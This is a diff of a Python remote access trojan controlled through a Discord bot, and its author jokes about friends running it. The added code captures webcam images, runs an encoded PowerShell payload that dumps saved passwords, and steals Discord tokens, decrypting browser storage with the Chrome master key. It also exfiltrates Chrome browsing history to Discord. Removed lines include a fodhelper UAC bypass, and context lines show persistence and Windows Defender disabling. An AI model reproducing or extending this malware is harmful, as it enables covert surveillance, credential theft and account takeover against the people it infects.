@@ -1,19 +1,20 @@
 # Developed by nspe (lol ive been working on this for 3 weeks cause i was bored)
+# If your a friend of mine and you ran this just know that I told you not to :pensive:
 
-# YOU MUST EDIT THESE LINES:
-# Line 47: Put your Bot Token in the '' section
-# Line 215: REPLACE the name syntax of "guild = discord.utils.get(bot.guilds, name='')" with the name of your server
+# CHANGE LINE 65 TO YOUR OWN BOT TOKEN
+# CHANGE NAME VARIABLE ON LINE 432 TO YOUR SERVER NAME
 
 #---------------------------------------#
 #               IMPORTS                 #
 #---------------------------------------#
 
 import discord
+import discord
 from discord.ext import commands
+import os
 import tkinter as tk
 import mss
 import cv2
-import os
 import numpy as np
 import webbrowser
 import ctypes
@@ -25,7 +26,6 @@ import socket
 import getpass
 import shutil
 import subprocess
-import requests
 import aiohttp
 import winshell
 import argparse
@@ -39,6 +39,24 @@ import win32crypt
 import time
 import inspect
 import winreg
+import sqlite3
+from re import findall
+from json import loads
+from base64 import b64decode
+import requests
+from subprocess import Popen, PIPE
+from urllib.request import Request, urlopen
+from datetime import datetime
+from threading import Thread
+from time import sleep
+import urllib.request
+from sys import argv
+from win32crypt import CryptUnprotectData
+from pynput.keyboard import Key, Listener
+import logging
+import threading
+import pygetwindow
+
 
 #---------------------------------------#
 #             TOKEN & VARS              #
@@ -49,8 +67,8 @@ intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='!', intents=intents)
 chatbox_window = None
 chat_text_widget = None
+print("monkey monkey ooga booga")
 
-@bot.event
 async def on_message(message):
     if message.content.startswith('!') and isinstance(message.channel, discord.TextChannel):
         session_id = message.channel.name
@@ -61,13 +79,252 @@ async def on_message(message):
         if session_id.lower() == bot_username.lower():
             await bot.process_commands(message)
         else:
-            print("troll")
+            await message.channel.send("This command cannot be executed in this session.")
     else:
         await bot.process_commands(message)
+
+keylog_enabled = False # DO NOT CHANGE MANUALLY
+selected_webcam = None
+webcam_indices = {}
+
+#---------------------------------------#
+#               SETTINGS                #
+#---------------------------------------#
+
+# WORK IN PROGRESS <3
 
 #---------------------------------------#
 #               COMMANDS                #
 #---------------------------------------#
+
+@bot.command()
+async def inputs(ctx):
+    try:
+        # Get list of input devices
+        input_devices = pygetwindow.getAllTitles()
+        if input_devices:
+            await ctx.send("List of connected input devices:")
+            for device in input_devices:
+                await ctx.send(device)
+        else:
+            await ctx.send("No input devices found.")
+    except Exception as e:
+        await ctx.send(f"An error occurred: {e}")
+
+@bot.command()
+async def webcams(ctx):
+    global webcam_indices
+    webcam_indices = {}
+    webcam_names = []
+    try:
+        index = 0
+        while True:
+            cap = cv2.VideoCapture(index)
+            if not cap.isOpened():
+                break
+            ret, _ = cap.read()
+            if ret:
+                webcam_name = f"Webcam {index}"
+                webcam_names.append(webcam_name)
+                webcam_indices[webcam_name] = index
+            cap.release()
+            index += 1
+    except Exception as e:
+        print(f"Error: {e}")
+    if webcam_names:
+        await ctx.send("List of connected webcams:")
+        for name in webcam_names:
+            await ctx.send(name)
+    else:
+        await ctx.send("No webcams found.")
+
+@bot.command()
+async def selectcam(ctx, *, webcam_name: str):
+    global selected_webcam
+    if webcam_name in webcam_indices:
+        selected_webcam = webcam_indices[webcam_name]
+        await ctx.send(f"Selected webcam {webcam_name}.")
+    else:
+        await ctx.send(f"Webcam {webcam_name} not found.")
+
+@bot.command()
+async def getcam(ctx):
+    global selected_webcam
+    if selected_webcam is not None:
+        cap = cv2.VideoCapture(selected_webcam)
+        ret, frame = cap.read()
+        cap.release()
+        if ret:
+            cv2.imwrite("webcam_image.jpg", frame)
+            await ctx.send("Picture captured!", file=discord.File("webcam_image.jpg"))
+            return
+    await ctx.send("No webcam selected or failed to capture picture.")
+
+@bot.command()
+async def passwords(ctx):
+    temp = os.getenv('temp')
+    print("Getting Temp")
+    def shell(command):
+        output = subprocess.run(command, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        global status
+        status = "ok"
+        print(status)
+        return output.stdout.decode('CP437').strip()
+    passwords = shell("Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBHAGwAdQBjADMAUgBoAGIAbQBOAGwASQBEADAAZwBXADAARgBqAGQARwBsADIAWQBYAFIAdgBjAGwAMAA2AE8AawBOAHkAWgBXAEYAMABaAFUAbAB1AGMAMwBSAGgAYgBtAE4AbABLAEYAdABUAGUAWABOADAAWgBXADAAdQBVAG0AVgBtAGIARwBWAGoAZABHAGwAdgBiAGkANQBCAGMAMwBOAGwAYgBXAEoAcwBlAFYAMAA2AE8AawB4AHYAWQBXAFEAbwBLAEUANQBsAGQAeQAxAFAAWQBtAHAAbABZADMAUQBnAFUAMwBsAHoAZABHAFYAdABMAGsANQBsAGQAQwA1AFgAWgBXAEoARABiAEcAbABsAGIAbgBRAHAATABrAFIAdgBkADIANQBzAGIAMgBGAGsAUgBHAEYAMABZAFMAZwBpAGEASABSADAAYwBIAE0ANgBMAHkAOQB5AFkAWABjAHUAWgAyAGwAMABhAEgAVgBpAGQAWABOAGwAYwBtAE4AdgBiAG4AUgBsAGIAbgBRAHUAWQAyADkAdABMADAAdwB4AFoAMgBoADAAVABUAFIAdQBMADAAUgA1AGIAbQBGAHQAYQBXAE4AVABkAEcAVgBoAGIARwBWAHkATAAyADEAaABhAFcANAB2AFIARQB4AE0ATAAxAEIAaABjADMATgAzAGIAMwBKAGsAVQAzAFIAbABZAFcAeABsAGMAaQA1AGsAYgBHAHcAaQBLAFMAawB1AFIAMgBWADAAVgBIAGwAdwBaAFMAZwBpAFUARwBGAHoAYwAzAGQAdgBjAG0AUgBUAGQARwBWAGgAYgBHAFYAeQBMAGwATgAwAFoAVwBGAHMAWgBYAEkAaQBLAFMAawBOAEMAaQBSAHcAWQBYAE4AegBkADIAOQB5AFoASABNAGcAUABTAEEAawBhAFcANQB6AGQARwBGAHUAWQAyAFUAdQBSADIAVgAwAFYASABsAHcAWgBTAGcAcABMAGsAZABsAGQARQAxAGwAZABHAGgAdgBaAEMAZwBpAFUAbgBWAHUASQBpAGsAdQBTAFcANQAyAGIAMgB0AGwASwBDAFIAcABiAG4ATgAwAFkAVwA1AGoAWgBTAHcAawBiAG4AVgBzAGIAQwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBKAEgAQgBoAGMAMwBOADMAYgAzAEoAawBjAHcAMABLACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA=")
+    print("Setting Password Var")
+    f4 = open(temp + r"\passwords.txt", 'w')
+    f4.write(str(passwords))
+    f4.close()
+    print("Doing F4 Stuff")
+    file = discord.File(temp + r"\passwords.txt", filename="passwords.txt")
+    await ctx.send("[*] Command successfully executed", file=file)
+    os.remove(temp + r"\passwords.txt")
+
+@bot.command()
+async def token(ctx):
+    LOCAL = os.getenv("LOCALAPPDATA")
+    ROAMING = os.getenv("APPDATA")
+    PATHS = [
+        ROAMING + "\\Discord",
+        ROAMING + "\\discordcanary",
+        ROAMING + "\\discordptb",
+        LOCAL + "\\Google\\Chrome\\User Data\\Default",
+        ROAMING + "\\Opera Software\\Opera Stable",
+        LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+        LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+    ]
+    regex1 = "[\\w-]{24}\.[\\w-]{6}\\.[\\w-]{27}"
+    regex2 = r"mfa\\.[\\w-]{84}"
+    encrypted_regex = "dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$]{120}"
+    
+    def getheaders(token=None, content_type="application/json"):
+        headers = {
+            "Content-Type": content_type,
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
+        }
+        if token:
+            headers.update({"Authorization": token})
+        return headers
+    
+    def getuserdata(token):
+        try:
+            return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
+        except:
+            pass
+    
+    def decrypt_payload(cipher, payload):
+        return cipher.decrypt(payload)
+    
+    def generate_cipher(aes_key, iv):
+        return AES.new(aes_key, AES.MODE_GCM, iv)
+    
+    def decrypt_password(buff, master_key):
+        try:
+            iv = buff[3:15]
+            payload = buff[15:]
+            cipher = generate_cipher(master_key, iv)
+            decrypted_pass = decrypt_payload(cipher, payload)
+            decrypted_pass = decrypted_pass[:-16].decode()
+            return decrypted_pass
+        except Exception:
+            return "Failed to decrypt password"
+    
+    def get_master_key(path):
+        with open(path, "r", encoding="utf-8") as f:
+            local_state = f.read()
+        local_state = json.loads(local_state)
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]
+        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+        return master_key
+    
+    def gettokens(path):
+        path1 = path
+        path += "\\Local Storage\\leveldb"
+        tokens = []
+        try:
+            if not "discord" in path.lower():
+                for file_name in os.listdir(path):
+                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for token in findall(regex1, line):
+                            try:
+                                r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
+                                if r.status_code == 200:
+                                    if token in tokens:
+                                        continue
+                            except Exception:
+                                continue
+                            tokens.append(token)
+                        for token in findall(regex2, line):
+                            try:
+                                r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
+                                if r.status_code == 200:
+                                    if token in tokens:
+                                        continue
+                            except Exception:
+                                continue
+                            tokens.append(token)
+            else:
+                for file_name in os.listdir(path):
+                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for y in findall(encrypted_regex, line):
+                            token = decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(path1 + '\\Local State'))
+                            try:
+                                r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
+                                if r.status_code == 200:
+                                    if token in tokens:
+                                        continue
+                                    tokens.append(token)
+                            except:
+                                continue
+            return tokens
+        except Exception as e:
+            return []
+    
+    alltokens = []
+    for i in PATHS:
+        e = gettokens(i)
+        for c in e:
+            alltokens.append(c)
+    await ctx.send("\n".join(alltokens))
+
+@bot.command()
+async def history(ctx):
+    try:
+        temp = os.getenv('TEMP')
+        username = os.getenv('USERNAME')
+        shutil.rmtree(os.path.join(temp, "history12"), ignore_errors=True)
+        os.mkdir(os.path.join(temp, "history12"))
+        
+        path_org = r"C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default\History".format(username)
+        path_new = os.path.join(temp, "history12")
+        copy_command = 'copy "{}" "{}"'.format(path_org, path_new)
+        os.system(copy_command)
+        
+        con = sqlite3.connect(os.path.join(path_new, "History"))
+        cursor = con.cursor()
+        cursor.execute("SELECT url FROM urls")
+        urls = cursor.fetchall()
+        for url in urls:
+            done = "".join(url)
+            with open(os.path.join(temp, "history12", "history.txt"), 'a') as f:
+                f.write(str(done))
+                f.write("\n")
+        con.close()
+        
+        file = discord.File(os.path.join(temp, "history12", "history.txt"), filename="history.txt")
+        await ctx.send("[*] Command successfully executed", file=file)
+        
+        def deleteme():
+            path = "rmdir /s /q " + os.path.join(temp, "history12")
+            os.system(path)
+        deleteme()
+    except Exception as e:
+        await ctx.send(f"An error occurred: {e}")
 
 @bot.command()
 async def startup(ctx, action):
@@ -151,46 +408,6 @@ def is_process_running(process_name):
         return process_name.lower() in str(output).lower()
     except subprocess.CalledProcessError:
         return False
-
-@bot.command()
-async def uacbypass(ctx):
-    class disable_fsr():
-        def __enter__(self):
-            self.disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
-            self.revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
-            self.old_value = ctypes.c_long()
-            self.disable(ctypes.byref(self.old_value))
-            return self.old_value
-
-        def __exit__(self, type, value, traceback):
-            self.revert(self.old_value)
-
-    await ctx.send("Checking if admin...")
-    isAdmin = os.getuid() == 0 if hasattr(os, 'getuid') else ctypes.windll.shell32.IsUserAnAdmin() != 0
-    if isAdmin:
-        await ctx.send("You're already admin!")
-    else:
-        await ctx.send("Attempting to get admin...")
-        isexe = sys.argv[0].endswith("exe")
-        if not isexe:
-            test_str = sys.argv[0]
-            current_dir = inspect.getframeinfo(inspect.currentframe()).filename
-            cmd2 = current_dir
-        else:
-            test_str = sys.argv[0]
-            current_dir = test_str
-            cmd2 = current_dir
-        create_reg_path = r"""powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force"""
-        os.system(create_reg_path)
-        create_trigger_reg_key = r"""powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force"""
-        os.system(create_trigger_reg_key)
-        create_payload_reg_key = f"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "Command" -Value 'cmd /c start ""{cmd2}""' -Force"""
-        os.system(create_payload_reg_key)
-        with disable_fsr():
-            os.system("fodhelper.exe")
-        time.sleep(2)
-        remove_reg = r"""powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force"""
-        os.system(remove_reg)
 
 @bot.command()
 async def disablewindef(ctx):
@@ -297,12 +514,6 @@ async def website(ctx, url: str):
 @bot.command()
 async def message(ctx, *, text: str):
     show_popup(text)
-
-@bot.command()
-async def cam(ctx):
-    await take_camera_screenshot()
-    await take_screenshot()
-    await send_screenshot(ctx)
 
 @bot.command()
 async def audio(ctx, *, text: str):
